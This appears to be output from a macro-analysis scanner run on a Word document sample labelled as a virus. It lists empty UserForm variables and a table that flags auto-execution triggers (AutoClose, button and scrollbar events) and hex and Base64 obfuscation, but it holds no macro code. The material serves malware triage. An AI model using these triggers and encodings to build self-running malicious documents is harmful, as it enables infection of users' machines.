VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton7'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |ScrollBar1_Change   |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

